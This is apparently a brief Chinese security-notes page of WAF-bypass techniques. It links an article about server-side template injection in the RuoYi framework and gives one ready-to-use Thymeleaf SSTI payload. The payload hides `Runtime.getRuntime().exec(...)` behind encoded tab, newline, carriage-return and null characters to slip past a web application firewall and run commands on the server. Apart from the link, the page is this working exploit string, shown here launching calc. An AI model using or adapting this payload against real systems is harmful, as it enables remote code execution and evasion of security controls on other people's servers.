# 绕过文章


+ [记一次实战之若依SSTI注入绕过玄某盾](https://mp.weixin.qq.com/s/7TCZDkfCXlmEhcTb85fw_Q)

```java
__${T%20(%0aRuntime%09).%0dgetRuntime%0a(%09)%0d.%00exec('calc')}__::.x
```
